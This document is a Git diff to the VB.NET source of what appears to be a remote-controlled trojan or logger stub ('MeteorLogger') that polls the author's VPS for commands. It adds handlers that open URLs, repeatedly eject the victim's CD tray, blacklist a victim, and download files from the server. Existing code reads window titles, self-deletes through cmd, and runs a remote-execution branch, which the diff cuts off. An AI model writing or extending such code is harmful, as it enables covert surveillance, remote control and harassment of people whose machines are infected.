@@ -12,7 +12,8 @@ Imports System.Management
 Public Class MainForm
     Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
     Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
-
+    'Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal Command As String, ByVal ReturnString As String, ByVal ReturnLength As Long, ByVal hWnd As Long) As Long
+    Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As UInt32, ByVal hwndCallback As IntPtr) As UInt32
     Private Function GetCaption() As String
         Dim Caption As New StringBuilder(256)
         Dim hWnd As IntPtr = GetForegroundWindow()
@@ -45,7 +46,6 @@ Public Class MainForm
             Return "N/A"
         End Try
     End Function
-
     Public Function GetGBRamAmount() As String
         Return Convert.ToInt32(My.Computer.Info.AvailablePhysicalMemory / My.Computer.Info.TotalPhysicalMemory).ToString("p")
     End Function
@@ -98,6 +98,17 @@ Public Class MainForm
         upTime += 1
         Return apiResponse
     End Function
+
+    Private Sub loopOpenCD(repeatAmount As Integer)
+        For i = 1 To repeatAmount
+            Try
+                mciSendString("set cdaudio door open", 0, 0, 0)
+                mciSendString("set cdaudio door closed", 0, 0, 0)
+            Catch ex As Exception
+                Exit For
+            End Try
+        Next
+    End Sub
     Private Sub mainBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles mainBW.DoWork
         While True
             Dim apiQuery As String = APIRequest()
@@ -111,11 +122,17 @@ Public Class MainForm
         End While
     End Sub
 
-    'Private Sub DefineEOFArgVar(ByRef EOFArg As String())
-    '   EOFArg = {My.Settings.vpsurl}
-    'End Sub
-
     Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        'My.Settings.bl = False
+        'My.Settings.blmsg = ""
+        'My.Settings.Save()
+
+        If My.Settings.bl Then
+            If My.Settings.blmsg.Trim <> "" Then
+                MsgBox(My.Settings.blmsg,, "")
+            End If
+            Environment.Exit(0)
+        End If
 
         ' EOF arguments parsing |
         '                       v
@@ -124,11 +141,6 @@ Public Class MainForm
         ' Dim Data As String = Space(LOF(1))
         ' FileGet(1, Data)
         ' FileClose(1)
-
-
-        ' Only for debugging purposes. I don't want to put the raw ip of my vps on Github, so
-        ' I put it in a file which the stub reads automatically.
-        'EOFArguments = {My.Settings.vpsurl} '{File.ReadAllText("C:\MeteorLogger\vpsurl.txt")}
 
         CheckForIllegalCrossThreadCalls = False
         mainBW.RunWorkerAsync()
@@ -182,11 +194,30 @@ Public Class MainForm
             Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath)
             Environment.Exit(0)
 
+        ElseIf actionType = "openURL" Then
+            Try
+                Process.Start(actionContent(0))
+            Catch ex As System.ComponentModel.Win32Exception
+                Exit Sub
+            End Try
+
         ElseIf actionType = "msgbox" Then
             MsgBox(actionContent(0),, "")
 
+        ElseIf actionType = "cdopen" Then
+            Dim mciLoopThread As New Thread(Sub() loopOpenCD(Convert.ToInt32(actionContent(0))))
+            mciLoopThread.Start()
+
+
         ElseIf actionType = "openremotechat" Then
             Invoke(Sub() RemoteChat.Show())
+
+        ElseIf actionType = "userblacklist" Then
+            My.Settings.bl = True
+            'TODO: Is the blacklist message really useful ?
+            My.Settings.blmsg = actionContent(0)
+            My.Settings.Save()
+            Environment.Exit(0)
 
         ElseIf actionType = "closeremotechat" Then
             Invoke(Sub() RemoteChat.Hide())
@@ -202,6 +233,15 @@ Public Class MainForm
             'End Try
 
         ElseIf actionType = "camerashare" Then
+            ' TODO : camera share
+
+        ElseIf actionType = "playmp3" Then
+            ' TODO : check this feature
+            Dim filename As String = actionContent(0)
+            MsgBox(actionContent(0))
+            mainWebClient.DownloadFile(My.Settings.vpsurl & "files/" & filename, filename)
+            File.Move(filename, Path.GetTempPath & filename)
+
 
         ElseIf actionType = "remotexec" Then
             Dim filename As String = actionContent(0)
